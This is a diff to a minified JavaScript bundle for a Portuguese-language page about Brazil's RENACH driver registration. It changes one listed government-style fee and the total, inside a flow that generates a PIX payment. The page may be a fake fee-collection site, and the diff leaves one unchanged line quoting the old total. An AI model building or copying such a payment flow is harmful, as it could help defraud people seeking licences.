@@ -22303,9 +22303,9 @@ O RENACH (Registro Nacional de Carteira de Habilitação) é o número de identi
 
 • Taxa de Expedição de Documento (TED): R$ 17,00
 • Taxa de Serviços Administrativos (TSA): R$ 21,50
-• Taxa de Processamento Eletrônico (TPE): R$ 29,60
+• Taxa de Processamento Eletrônico (TPE): R$ 29,20
 
-Valor Total: R$ 68,10`, 3e3), i("finalize_button")
+Valor Total: R$ 67,70`, 3e3), i("finalize_button")
     }, ww = async () => {
       tc("Finalizar Cadastro", !1), i("generating_pix"), Q("");
       const B = setTimeout(() => {
@@ -22968,14 +22968,14 @@ Assim que realizar o pagamento das taxas no valor de R$ 68,10, clique no botão 
                       children: "TAXA DE PROCESSAMENTO ELETRÔNICO (TPE)"
                     }), l.jsx("span", {
                       className: "font-semibold",
-                      children: "29,60"
+                      children: "29,20"
                     })]
                   }), l.jsxs("div", {
                     className: "flex justify-between py-2 bg-gray-100 px-2 font-bold",
                     children: [l.jsx("span", {
                       children: "TOTAL"
                     }), l.jsx("span", {
-                      children: "68,10"
+                      children: "67,70"
                     })]
                   })]
                 })]
